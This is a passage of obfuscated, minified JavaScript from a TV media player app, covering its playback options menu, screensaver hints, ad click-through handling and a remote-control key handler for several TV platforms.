if(vPlayer.player().volume)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPGromkost_",!1,"volume");if(vPlayer.player().setSize)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPProporcii_ _FPvideo_: "+maJor.params.get('xmode'),!0,"prop");if(vPlayer.player().fullscreen)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPInFullScreen_",!0,"full");if(vPlayer.player().audioTracks&&(curA=vPlayer.player().audioTracks())){if(curA.count>1)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"Audio: "+curA.name+" "+(curA.sel+1)+"/"+curA.count+"",!1,"audio")}
if(vPlayer.player().quality&&(curA=vPlayer.player().quality())){if(curA.count>1)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"Quality: "+curA.name+" "+(curA.sel+1)+"/"+curA.count,!1,"quality")}
if(vPlayer.player().subtitle&&vPlayer.player().sub_all)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPSubtitles_ MKV: "+vPlayer.player().sub_sel+"/"+vPlayer.player().sub_all,!1,"setsubtitle");if(vPlayer.player().name=="maple"){if(vPlayer.player().Screen3Dplugin)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPTip_ 3D",!1,"sams3d");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPBuffer_: "+vPlayer.maple.abf[maJor.params.get("buffer")]+" Мб",!1,"samsbuf");if(maJor.params.get('xmode')==2){llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPShirina_: "+maJor.params.get('Pw')+"%",!1,"setpw");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPVisota_: "+maJor.params.get('Ph')+"%",!1,"setpw")}}
if(maJor.params.get('xmode')==4&&(lIllO0Imlel1IlI1Ypr=="html5"||lIllO0Imlel1IlI1Ypr=="ifrhtml5")){if(maJor.params.get('Pw')<200)maJor.params.set('Pw',1280);if(maJor.params.get('Ph')<200)maJor.params.set('Ph',720);llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPShirina_: "+maJor.params.get('Pw')+"",!1,"setpw");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPVisota_: "+maJor.params.get('Ph')+"",!1,"setph")}
if(window.NetCastLaunchQMENU)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPOpciiEkrana_",!0,"lgoptions");if(maJor.platform().match(/lg/)&&lIllO0Imlel1IlI1Ypr=="media")llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPPredpDor_: "+optLang[optLangSel],!1,"lgzvdor");if(vPlayer.player().getRate)llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"Rate: "+vPlayer.player().getRate()+"x",!1,"rate");if(vPlayer.subtitles.exis())llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPSubtitles_: "+vPlayer.subtitles.getName(),!1,"subtitle");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPAdd stripes_:"+(whitestripes<1?"_FPOtkl._":whitestripes+"px"),!1,"whitestripes");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,sNext[maJor.params.get('next')],!1,"rezhim");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPDisplay time_: "+shint(maJor.params.get("time")),!1,"time");llO0I111lvwajllII11Ypr+=llII1OlOTlulOI1l0Ypr(id++,"_FPZakrit_",!0,"close");$_("QualCh").style.display="block";kjtYpr.opLength=id;$_("QualCh",llO0I111lvwajllII11Ypr);handler="qual";l0II0Iluol00101Ypr();vPlayer.showPlayer()}
function l0II0Iluol00101Ypr(){if(kjtYpr.lIO10OlItOlLXQlllYpr<0)kjtYpr.lIO10OlItOlLXQlllYpr=kjtYpr.opLength-1;else if(kjtYpr.lIO10OlItOlLXQlllYpr==kjtYpr.opLength)kjtYpr.lIO10OlItOlLXQlllYpr=0;for(var i=0;i<kjtYpr.opLength;i++){if(i==kjtYpr.lIO10OlItOlLXQlllYpr){$_("qllO0I111lvwajllII11Ypr"+i).style.color="#FFFFFF"}else{$_("qllO0I111lvwajllII11Ypr"+i).style.color="#888888"}}}
var l11l1CHyvO1Il1Ypr=null;function lI0100OA0fO0I0lIYpr(x,opt){try{opt=opt||optId[kjtYpr.lIO10OlItOlLXQlllYpr];switch(opt){case "sams3d":vPlayer.player().Set3Dtype(x);break;case "samsbuf":maJor.params.set("buffer",parseInt(maJor.params.get("buffer"))+x);vPlayer.player().SetBuffer(maJor.params.get("buffer"));break;case "setpw":maJor.params.set('Pw',parseInt(maJor.params.get('Pw'))+x);$_("opText"+kjtYpr.lIO10OlItOlLXQlllYpr,"_FPShirina_: "+maJor.params.get('Pw')+"");vPlayer.chvr=!0;vPlayer.player().setSize();break;case "setph":maJor.params.set('Ph',parseInt(maJor.params.get('Ph'))+x);$_("opText"+kjtYpr.lIO10OlItOlLXQlllYpr,"_FPVisota_: "+maJor.params.get('Ph')+"");vPlayer.chvr=!0;vPlayer.player().setSize();break;case "time":maJor.params.set('time',!maJor.params.get('time'));break;case "setsubtitle":vPlayer.player().subtitle(vPlayer.player().sub_sel()+x);break;case "rezhim":maJor.params.set('next',(parseInt(maJor.params.get('next'))||0)+x);if(maJor.params.get('next')<1)maJor.params.set('next',3);else if(maJor.params.get('next')>3)maJor.params.set('next',1);break;case "subtitle":vPlayer.playElement.sub_sel+=x;vPlayer.subtitles.lQO1OHMPvAl00OYpr();l10I11l10duklS11llOYpr();break;case "volume":var xv=vPlayer.player().volume()+x*5;if(xv>100)xv=100;if(xv<0)xv=0;l10I11l10duklS11llOYpr("Громкость: "+vPlayer.player().volume(xv));break;case "whitestripes":vPlayer.setWhitestripes(x);break;case "lgzvdor":optLangSel+=x;if(optLangSel>optLang.length-1)optLangSel=0;else if(optLangSel<0)optLangSel=optLang.length-1;media.audioLanguage=optLang[optLangSel];kjtYpr.l000Olt0SO1OlO0Ypr("mlang",optLangSel);break;case "full":vPlayer.player().fullscreen();$_("QualCh").style.display="none";handler="player";return;break;case "close":$_("QualCh").style.display="none";handler="player";return;break;case "lgoptions":window.NetCastLaunchQMENU();break;case "prop":maJor.params.set('xmode',parseInt(maJor.params.get('xmode'))+x);vPlayer.chvr=1;vPlayer.player().setSize();break;case "quality":vPlayer.player().quality(vPlayer.player().quality().sel+x);break;case "audio":vPlayer.player().audioTracks(vPlayer.player().audioTracks().sel+x);break;case "rate":var curA=vPlayer.player().getRate()+x*0.25;if(curA>4)curA=0.25;else if(curA<0.25)curA=4;vPlayer.player().rate(curA);break;default:if(opt.indexOf("enterqual")==0){var q=opt.split("enterqual")[1];if(vPlayer.playElement.json_url){var url=vPlayer.playElement.json_url[q].url;vPlayer.playElement.json_select=q;if(gV(vPlayer.playElement.json_url[q],"audio").toString().indexOf("http")==0)url+="#AUDIO="+vPlayer.playElement.json_url[q].audio;l10I11l10duklS11llOYpr("Play "+q+"p");if(vPlayer.playUrlAudio&&vPlayer.sound)vPlayer.sound.src="";lII11lAO1IOllYpr(vPlayer.streamnum(url),null,vPlayer.getCur());$_("QualCh").style.display="none";handler="player";return}else l10I11l10duklS11llOYpr("_FPOshibka_ _FPparsingaVideossilki_!")}
break}
newOptions()}catch(e){}}
function llII1OlOTlulOI1l0Ypr(id,text,click,x){optId[id]=x;var s="<div style='width: 100%;height: "+css_wh(43)+"px; overflow:hidden;' onmousemove=\"kjtYpr.lIO10OlItOlLXQlllYpr="+id+";l0II0Iluol00101Ypr();\" id='qllO0I111lvwajllII11Ypr"+id+"'><div onclick=\"lI0100OA0fO0I0lIYpr(-1);\" style='float:left;'><img width='"+css_w(40)+"' src='"+_img("_ST_turn_left.png")+"' ></div><div onclick=\"lI0100OA0fO0I0lIYpr(1);\" style='float:right;'><img width='"+css_w(40)+"' src='"+_img("_ST_turn_right.png")+"' ></div><div onclick=\"if("+click+"==true) lI0100OA0fO0I0lIYpr(0);\"  id='opText"+id+"' style='font-size:"+css_wh(27)+"px;padding-top:3px;width:auto;overflow:hidden;word-break: break-all;text-align:center;height:"+css_wh(32)+"px;'>"+text+"</div></div>";return s}
function l10I11l10duklS11llOYpr(text){clearTimeout(inftimer);$_("infR",vPlayer.getInfo());$_("infPl",(text||""));$_("pstream").style.display="block";inftimer=setTimeout(function(){if($_("playerBottom").style.display=="none"){$_("pstream").style.display="none";$_("infPl","")}},1500);vPlayer.triggerHide(4000)}
function trim2(str){return str.toString().replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,'')}
function show_desc(mode){if(mode){$_("site").style.display="block";$_("top").style.display="block";$_("inset").style.display="block";$_("top2").style.display="block";$_("bottom").style.display="block"}else{$_("site").style.display="none";$_("top").style.display="none";$_("inset").style.display="none";$_("top2").style.display="none";$_("bottom").style.display="none"}}
var buff={scrollsite:0,ch:{},cleartop:function(){this.scrollsite=null;this.ch={}},chtop:function(n){var c=this;if(typeof c.ch[n]=="undefined"){c.ch[n]=$_("ch"+n).offsetTop}
return c.ch[n]},scrollsitetop:function(n){if(this.scrollsite==null)this.scrollsite=$_("scrollsite").scrollTop;if(n!=null){$_("scrollsite").scrollTop=n;this.scrollsite=$_("scrollsite").scrollTop}
return this.scrollsite}};var scrhint=[1,"This is a cross-platform application for displaying custom multimedia pages. It does not contain any content and is a so-called White Label application.","View pages in JSON (JavaScript Object Notation), XML, or M3U format from any CORS-enabled HTTP server","You can create your own content or open existing and shared content from other people."];var scrhintru=[1,"Перед вами кроссплатформенное приложение для отбражения настраиваемых мультимедийных страниц. Он не содержит никакого контента и представляет собой так называемое приложение White Label.","Просматривайте страницы в формате JSON (JavaScript Object Notation), XML или M3U с любого HTTP-сервера, поддерживающого CORS","Вы можете создать свой собственный контент или открывать существующий и общий контент от других людей."];function screensaver(m){if(m&&maJor.params.get('scrsaver')>0){if(parseInt(maJor.params.get('scrsaver'))==1){screensaver_mod(1);var pos1=["bottom","top"][_.random(0,1)];var pos2=["left","right"][_.random(0,1)];$_("scrsaver","<div id='scrdiv' style='margin:10px;position: absolute; "+pos1+": 0px; "+pos2+": 0px;width:30%;height:20%;'>"+scrhint[scrhint[0]]+"</div>");setTimeout(function(){if($_("scrdiv")!=null){if(++scrhint[0]>scrhint.length-1)scrhint[0]=1;screensaver(m)}},12000)}
if(parseInt(maJor.params.get('scrsaver'))==2){screensaver_mod(1)}}}
function screensaver_mod(m){if(m==1){isScreensaver=!0;$_("scrsaver").style.width="100%";$_("scrsaver").style.height="100%";$_("scrsaver").style.display="block";$_("scrsaver").style.zIndex="3"}else if(m==0){isScreensaver=!1;$_("scrsaver").style.width="0px";$_("scrsaver").style.height="0px";$_("scrsaver").style.display="none";$_("scrsaver").style.zIndex="-1";$_("scrsaver","")}}
if(hashR){window.addEventListener("popstate",function(n){if(nkh<3&&(document.location.hash!="#"+numBack2||document.location.hash=="#"+numBack)){keyHandler({"keycode":VK_BACK});sethash()}},!1)}
var backCounter=0;function sethash(n){if(hashR){backCounter++;numBack=numBack2;var h=document.location.hash.replace("#","").split(";");if(h.length==1)h[0]="";if(n==null)n=getInfoUrl();if(n==null)n=h[0];else{n=n.replace(/[^a-zA-Z0-9:\/_\.=\?\-\&]/g,"")}
n+=";"+backCounter;numBack2=n;document.location.hash=numBack2}}
if(!navigator.userAgent.match(/aForkXMLviewer/))document.addEventListener('keydown',function(event){keyHandler(event)},!1);var nkh=0,brs=0,tTimer=null,rrT=null,rrK=null,start1=0,kth=0;function keyHandler(e){event=e||event;start1=new Date().getTime();key=event.keyCode||event.keycode||event.which||-1;if(key==-1){return!1}
if(hashR&&key==VK_BACK){if(++nkh>3){kjtYpr.popUp("Error hash back button!",2000);return}}
if(key==463)key=VK_PAUSE;if(key==10009)key=VK_BACK;if(handler=="vk"&&maJor.params.get("keyboard")=="system"&&VK.focus.getAttribute("readonly")==null&&maJor.build<7&&key!=VK_BACK){return!0}
if(isScreensaver){screensaver_mod(0);return}
screensavertimer=-1;clearTimeout(tTimer);if(handler=="confirm"&&$_("l1Q0011lOE10u1OQ1O1Ypr")==null)handler="menu";if(handler=="iframe"){return;if(key==VK_BLUE){if(iframeExit)document.location.reload();iframeExit++}else iframeExit=0}
if(maJor.platform()=="android-device"){try{okey=String(key);var nn=0;for(var x in event)nn++;if(handler=="menu"&&okey.indexOf("/")==-1&&nn==1&&(key==VK_DOWN||key==VK_UP)){return}else if(okey.match(/_del/i))key=VK_BACK;else if(okey.match(/red/i))key=VK_RED;else if(okey.match(/green/i))key=VK_GREEN;else if(okey.match(/blue/i))key=VK_BLUE;else if(okey.match(/yellow/i))key=VK_YELLOW;else if(okey.match(/info/i))key=VK_INFO;else if(okey.match(/F5/))key=VK_RED;else if(okey.match(/F6/))key=VK_GREEN;else if(okey.match(/F7/))key=VK_YELLOW;else if(okey.match(/F8/))key=VK_BLUE;else if(okey.match(/menu/i)){if(ttmac&&handler=="menu"){if(curCh()["playlist_url"].indexOf("?list=")>0){var k=curCh()["playlist_url"].split("?list=")[1];$_("description",unescape(k))}else $_("description",curCh()["playlist_url"]+curCh("stream_url"))}
key=VK_RED}else if(okey.match(/center/i))key=VK_ENTER;else if(okey.match(/(channeldown|previous)/i))key=VK_PAGE_DOWN;else if(okey.match(/(channelup|next)/i))key=VK_PAGE_UP;else if(okey.match(/pause/i))key=VK_PAUSE;else if(okey.match(/mediaplay/i))key=VK_PLAY;else if(okey.match(/stop/i))key=VK_STOP;else if(okey.match(/rewind/i))key=VK_REWIND;else if(okey.match(/forward/i))key=VK_FAST_FWD;else if(okey.match(/left/i))key=VK_LEFT;else if(okey.match(/up/i))key=VK_UP;else if(okey.match(/right/i))key=VK_RIGHT;else if(okey.match(/down/i))key=VK_DOWN;else if(okey.match(/(enter|inter)/i))key=VK_ENTER;else{var kk=key.split("/");k1=parseInt(kk[0]);k2=parseInt(kk[1]);if(isNaN(k1))k1=0;if(isNaN(k2))k2=0;if(k1>k2)key=k1;else if(k2>k1)key=k1;if(key==82)key=VK_RED}}catch(e){}}
if(key==8&&maJor.platform()!="maple")key=VK_BACK;if(booting){if(((key==VK_RED||key==VK_A))||(maJor.platform()=="maple"&&key==tvKey.KEY_TOOLS)){if(brs++)sbrosok(!0);return}}
if(!gV(event,"repeat")){if(key==rrK){rrK=null;return}else{rrK=key;setTimeout("rrK=null;",40)}}
if(maJor.platform()=="maple"){if(key==VK_BACK||key==VK_EXIT){if(kjtYpr.Exittrue<2){widgetAPI.blockNavigation(event)}}else if(key==tvKey.KEY_PANEL_VOL_UP||key==tvKey.KEY_VOL_UP){vPlayer.maple.volume(90);return}else if(key==tvKey.KEY_VOL_DOWN||key==tvKey.KEY_PANEL_VOL_DOWN){vPlayer.maple.volume(10);return}else if(key==tvKey.KEY_MUTE){vPlayer.isMuted=!vPlayer.isMuted;vPlayer.maple.pluginAudio.SetUserMute(vPlayer.isMuted?1:0);return}}else if(maJor.platform()!="android-device"&&event.stopPropagation){try{event.stopPropagation();event.preventDefault();event.stopImmediatePropagation()}catch(e){}}
if(maJor.platform()=="mag"){if(key==KEY_VOLUME_PLUS){xVol+=5;if(xVol>100)xVol=100;stb.SetVolume(xVol);l10I11l10duklS11llOYpr("Громкость: "+xVol)}
if(key==KEY_VOLUME_MINUS){xVol-=5;if(xVol<0)xVol=0;stb.SetVolume(xVol);l10I11l10duklS11llOYpr("Громкость: "+xVol)}
if(key>30)kjtYpr.Exittrue=0}else if(key!=VK_EXIT)kjtYpr.Exittrue=0;if(maJor.platform()=="sony"){if(key==112)key=VK_BLUE;else if(key==113)key=VK_RED;else if(key==114)key=VK_GREEN;else if(key==115)key=VK_YELLOW;else if(key==457)key=VK_INFO}
if($_("hint")!=null){$_("hint").style.border="4px solid black";setTimeout('$("#hint").remove();',100);if(key!=VK_ENTER&&key!=VK_BACK)return}
if(handler!="confirm"&&handler!="vk"&&tscreen=="game"&&(key==VK_BACK||key==VK_ENTER||key==VK_DOWN||key==VK_UP)){if(key==VK_BACK){if(!tomflight_f)tomflight_fail();else{tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"}}
if(key==VK_UP){tomflight_click()}else if(key==VK_DOWN){tomflight_down()}else{tomflight_click()}
return}
if(handler=="confirm"&&$_("vk").style.display=="block")handler="vk";switch(parseInt(maJor.params.get("return"))){case 1:if(key==VK_RED||key==VK_A)key=VK_BACK;break;case 2:if(key==VK_GREEN)key=VK_BACK;break;case 3:if(key==VK_YELLOW)key=VK_BACK;break;case 4:if(key==VK_BLUE)key=VK_BACK;break;case 5:if(key==VK_LEFT){if(handler=="menu"&&select>=0&&!l0O0l0111mJXG1OII1OYpr())key=VK_BACK}
break}
if(handler=="ext"){if(key==VK_RED||key==VK_A||key==VK_BACK){ext_close();return}
if($_("ext").style.display=="none"||typeof $_("frame-id")=="undefined")handler="menu";if(key==VK_BACK)$_("frame-id").contentWindow.postMessage({'cmd':'return','text':''},"*")}
if(key!=VK_ENTER)doubleEvent=0;switch(handler){case "confirm":switch(key){case VK_LEFT:confirmed.sel("--");break;case VK_RIGHT:confirmed.sel("++");break;case VK_ENTER:confirmed.click();break;case VK_BACK:confirmed.close();break;case VK_DOWN:break;case VK_UP:break;default:break}
break;case "description":switch(key){case VK_DOWN:case VK_RIGHT:$_("zpanel").scrollTop+=100;break;case VK_LEFT:case VK_UP:$_("zpanel").scrollTop-=100;break;case VK_BACK:case VK_ENTER:case VK_STOP:handler="menu";$_("zpanel").style.display="none";$_("zpanel","");$_("controlcontent").style.display="block";$_("description").style.display="block";$_("menu").style.display="block";break}
break;case "move":switch(key){case VK_DOWN:kjtYpr.Edit(gP("lII1I1PVBuI1lIlYpr"),"down");handler="move";break;case VK_LEFT:kjtYpr.Edit(gP("lII1I1PVBuI1lIlYpr"),"left");handler="move";break;case VK_RIGHT:kjtYpr.Edit(gP("lII1I1PVBuI1lIlYpr"),"right");handler="move";break;case VK_UP:kjtYpr.Edit(gP("lII1I1PVBuI1lIlYpr"),"up");handler="move";break;case VK_BACK:case VK_ENTER:handler="menu";break}
break;case "context":switch(key){case VK_DOWN:if(subMenu.length)kjtYpr.llI0IOruD0IOI1IYprPos(++subl0I10IWOIOOO1IYpr,!0);else kjtYpr.llI0IOruD0IOI1IYprPos(++l0I10IWOIOOO1IYpr);break;case VK_UP:if(subMenu.length)kjtYpr.llI0IOruD0IOI1IYprPos(--subl0I10IWOIOOO1IYpr,!0);else kjtYpr.llI0IOruD0IOI1IYprPos(--l0I10IWOIOOO1IYpr);break;case VK_ENTER:subMenuEnter();break;case VK_RED:case VK_A:case VK_BACK:case 8:case 220:Menu=[];$_("MenuCh","");$_("MenuCh").style.display="none";closeSubMenu();handler="menu";break}
break;case "vk":VK.handler(key);break;case "qual":switch(key){case VK_BACK:case 8:case 220:$_("QualCh").style.display="none";handler="player";break;case VK_LEFT:lI0100OA0fO0I0lIYpr(-1);break;case VK_RIGHT:lI0100OA0fO0I0lIYpr(1);break;case VK_UP:kjtYpr.lIO10OlItOlLXQlllYpr--;l0II0Iluol00101Ypr();break;case VK_DOWN:kjtYpr.lIO10OlItOlLXQlllYpr++;l0II0Iluol00101Ypr();break;case VK_ENTER:lI0100OA0fO0I0lIYpr(0);break;case VK_BLUE:vPlayer.player().setSize(parseInt(maJor.params.get('xmode'))+1);newOptions();break}
break;case "menu":if($_("ext")&&$_("ext").style.display=="block"){handler="ext";kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);return}
if(vPlayer.audio.vk_visual){if(key==VK_BACK||key==8||key==220||key==VK_LEFT||key==VK_RIGHT||key==VK_LEFT||key==VK_DOWN||key==VK_ENTER||key==VK_STOP){vPlayer.audio.visual();return}}
switch(key){case VK_0:setKey(0);break;case VK_1:setKey(1);break;case VK_2:setKey(2);break;case VK_3:setKey(3);break;case VK_4:setKey(4);break;case VK_5:setKey(5);break;case VK_6:setKey(6);break;case VK_7:setKey(7);break;case VK_8:setKey(8);break;case VK_9:setKey(9);break;case VK_EXIT:kjtYpr.Exittrue++;if(kjtYpr.Exittrue<2){kjtYpr.inf("_FPNazhmExitEsheRazDlyaVihoda_!",1300,"red")}else{if(maJor.params.get('ts'))autoexport();else closeapp()}
break;case VK_PAGE_UP:case 33:kth=0;if($_("scrolled")!=null)var nd="scrolled";else nd="description";if($_(nd).scrollTop<=0){$_(nd).scrollTop=0;if(getSelect()>=0){if(gP().menu.length)IlO11lQ0().focused(0);IlO11lQ0().focused(-1)}else buff.scrollsitetop(buff.scrollsitetop()-250)}else $_(nd).scrollTop-=25;break;case VK_PAGE_DOWN:case 34:if(getSelect()==-1){select=oldselect;IlO11lQ0().focused();return}else{if($_("scrolled")!=null)var nd="scrolled";else nd="description";var th=$_(nd).scrollTop;$_(nd).scrollTop+=25;if(th==$_(nd).scrollTop){if(nd=="scrolled"&&kth<3){kth++;var div=document.createElement('div');div.id="blinkdiv";div.style.position="relative";div.style.height="0px";div.style.marginTop="-4px";div.style.display="block";div.style.width=$_(nd).style.width+"px";div.style.border="2px solid red";$_(nd).appendChild(div);setTimeout('$_("blinkdiv").parentNode.removeChild($_("blinkdiv"));',800)}else buff.scrollsitetop(buff.scrollsitetop()+250)}else kth=0}
break;case VK_BACK:case 8:case 220:if(menuSubSel>-2)return menu_hideSub();clearTimeout(backtimer);backtimer=setTimeout(function(){plmini_canplay=!0;IlO11lQ0().back()},30);break;case VK_N:case VK_FAST_FWD:if(vPlayer.audio.played())vPlayer.audio.play(null,++vPlayer.audio.sel);break;case VK_REWIND:if(vPlayer.audio.played())vPlayer.audio.play(null,--vPlayer.audio.sel);break;case VK_BLUE:gotoStart();break;case VK_RED:case VK_A:if($_("ext").style.display=="block"){handler="menu";$_("ext","");$_("ext").style.display="none";return}
if(vPlayer.minimize)vPlayer.minimizeplayer(!1);else kjtYpr.llI0IOruD0IOI1IYpr();break;case VK_GREEN:case VK_B:if(typeof curCh()["green"]=="object"){olI11lQ1OhFv1II1Ypr(curCh()["green"])}else olI11lQ1OhFv1II1Ypr("about:favorites");break;case VK_YELLOW:case VK_C:if(typeof curCh()["yellow"]=="object"){olI11lQ1OhFv1II1Ypr(curCh()["yellow"])}else if(curCh()["yellow_url"]!=""){var ch={};ch.title=curCh()["yellow_title"];ch.parser=curCh()["yellow_parser"];ch.playlist_url=curCh()["yellow_url"];olI11lQ1OhFv1II1Ypr(ch)}else{kjtYpr.llI0IOruD0IOI1IYpr('topmenu')}
break;case VK_Q:if(ttmac||document.location.href.indexOf("960_540")>0){if(curCh()["playlist_url"].indexOf("?list=")>0){var k=curCh()["playlist_url"].split("?list=")[1];$_("description").innerHTML=unescape(k)}else $_("description").innerHTML=curCh()["playlist_url"]+curCh("stream_url")}
break;case VK_RIGHT:osetPos(1,0);break;case VK_LEFT:osetPos(-1,0);break;case VK_UP:if($_("scrolltextarea")&&$_("scrolltextarea").scrollTop>0)$_("scrolltextarea").scrollTop-=200;else osetPos(0,-1);break;case VK_DOWN:if($_("scrolltextarea"))$_("scrolltextarea").scrollTop+=200;else osetPos(0,1);break;case VK_ENTER:if(doubleEvent){doubleEvent=0;kjtYpr.llI0IOruD0IOI1IYpr()}else{doubleEvent=1;doubleTimer=setTimeout(function(){if(doubleEvent){doubleEvent=0;if(getSelect()==-4){eval(maJor.omniBut[oInset.omni_hor].onclick)}else if(getSelect()==-3)menu_play();else if(getSelect()==-2)sidebar_play();else if(getSelect()==-1)oInset.playInset();else IlO11lQ0().play()}},300)}
break;case VK_BLUE:gotoStart();break;case VK_P:case VK_PLAY:if(gP().is_iptv>2){play_mini()}else{if(vPlayer.audio.active){if(parseInt($_('vk_audio_pos').style.width)<2||vPlayer.stopped){vPlayer.audio.play();$_("vk_play_button").style.display="none"}else vPlayer.play()}}
break;case VK_PAUSE:if(vPlayer.audio.played())vPlayer.pause();break;case VK_STOP:case VK_S:if(vPlayer.audio.played()&&vPlayer.stopped){$_("vk_audio").style.display="none";$_("vk_audio").style.zIndex="-2";$_("vk_play_button").style.display="block"}
if(vPlayer.minimize)vPlayer.minimizeplayer(!1);vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();is_loadpage(-1);break}
break;case "player":vPlayer.showPlayer();if(rek_url&&is_rek){if(key==VK_LEFT){rek_sel--;rekBox()}
if(key==VK_RIGHT){rek_sel++;rekBox()}
if(key==VK_PAUSE)vPlayer.pause();else if(vPlayer.paused)vPlayer.play();else if(key==VK_ENTER){if(rek_sel==0&&Point["ClickThrough"]){vPlayer.pause();confirmed.create("Перейти по обьявлению <b>"+Point["linkTxt"]+"</b>?<br>"+(Point["ClickThrough"].indexOf("html://")==0?"ForkPlayer при этом будет закрыт!":Point["ClickThrough"]),"_FPAre you sure_?");confirmed.fun0=function(){lO1l0Ql0lpNwI01OOYpr(gV(Point,"complete"),"half");vPlayer.endrek();vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();if(Point["ClickThrough"].indexOf("html://")==0){document.location=Point["ClickThrough"].substr(7)}else if(Point["ClickThrough"].indexOf("http")==0&&Point["ClickThrough"].indexOf("xml")==-1){if(maJor.platform()=="android-device")document.location=Point["ClickThrough"];else{$_("ext").style.display="block";$_("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; background-color:black;" width="1280" height="640" src="'+Point["ClickThrough"]+'" />');kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен сайт в iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);handler="ext"}}else OpenUrl({"title":"Реклама "+Point["linkTxt"],"playlist_url":Point["ClickThrough"]})};confirmed.fun1=function(){handler="player";vPlayer.play()}}else if(Point["skipTime"]&&Point["skipTime"]<vPlayer.getCur()){vPlayer.pause();vPlayer.endrek();rek_url="";setTimeout(function(){lO1l0Ql0lpNwI01OOYpr(Point["skip"],"skip")},150);return}}
return!1}
b="player"+key;switch(key){case VK_0:setPercent(0);break;case VK_1:setPercent(10);break;case VK_2:setPercent(20);break;case VK_3:setPercent(30);break;case VK_4:setPercent(40);break;case VK_5:setPercent(50);break;case VK_6:setPercent(60);break;case VK_7:setPercent(70);break;case VK_8:setPercent(80);break;case VK_9:setPercent(90);break;case VK_FAST_FWD:vPlayer.frw(1);break;case VK_REWIND:vPlayer.frw(-1);break;case 259:case 10190:flastView();break;case VK_L:case VK_INFO:if($_("loading").style.display=="block")$_("loading").style.display="none";info_mode++;if(info_mode>4){info_mode=0;hidePlayer()}
if(info_mode==1){}else if(info_mode==2){info_mode++;hidePlayer()}else if(info_mode==3){hidePlayer()}else if(info_mode==4){hidePlayer()}
if(info_mode>0)return;break;case 32:case 10252:if(vPlayer.paused){if(vPlayer.l11III0l1u1FMO10OYpr)vPlayer.l0Ol1NZIl1l11Ypr();else vPlayer.play()}else vPlayer.pause();break;case VK_PAUSE:vPlayer.pause();break;case VK_PLAY:if(vPlayer.l11III0l1u1FMO10OYpr){vPlayer.l0Ol1NZIl1l11Ypr()}else vPlayer.play();break;case VK_STOP:case VK_EXIT:case VK_BACK:vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();break;case VK_Y:case VK_YELLOW:if(gP().is_iptv>2){vPlayer.minimizeplayer(!0);set_epg()}else if(vPlayer.player().quality)lI0100OA0fO0I0lIYpr(1,"quality");break;case VK_A:case VK_RED:vPlayer.minimizeplayer(!0);break;case VK_BLUE:if(vPlayer.player().setSize)lI0100OA0fO0I0lIYpr(1,"prop");break;case VK_GREEN:if(vPlayer.player().audioTracks)lI0100OA0fO0I0lIYpr(1,"audio");else if(lIllO0Imlel1IlI1Ypr=="media"&&maJor.platform().match(/lg/))lI0100OA0fO0I0lIYpr(1,"lgzvdor");break;case VK_RIGHT:if(vPlayer.playUrl=="description"){plDesc-=720;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
FsetFocus(1);break;case VK_LEFT:if(vPlayer.playUrl=="description"){plDesc+=720;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
FsetFocus(-1);break;case VK_UP:if(vPlayer.playUrl=="description"){plDesc+=15;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
if(rowID<3){rowID++}
if(!is_arc&&!is_vod()&&pstream&&rowID==2)rowID++;if(rowID==3){ll0Q10Pu10O10l1IlYpr=cntIndex;cntIndex>1?cntIndex=1:""}
try{FsetFocus(0)}catch(e){kjtYpr.popUp("Err set focus:<br>"+e.toString(),3000);lII11lAO1IOllYpr(url)}
break;case VK_DOWN:if(vPlayer.playUrl=="description"){plDesc-=15;$_("jw").style.marginTop=plDesc+"px";return}
if(rowID>1){rowID--;ll0Q10Pu10O10l1IlYpr!=-1?cntIndex=ll0Q10Pu10O10l1IlYpr:""}
if(!is_arc&&!is_vod()&&pstream&&rowID==2)rowID--;FsetFocus(0);break;case VK_ENTER:if($_("playerBottom").style.display=="block")selectedButton();break;case VK_PAGE_UP:l10IQI0OcGKI011Il11Ypr();break;case VK_PAGE_DOWN:l0l0II11lpoPKl1l0Ypr();break;case VK_MUTE:plVolume(0,!0)
break;case KEY_VOLUME_PLUS:plVolume(10);break;case KEY_VOLUME_MINUS:plVolume(-10);break}
vPlayer.triggerHide();break}
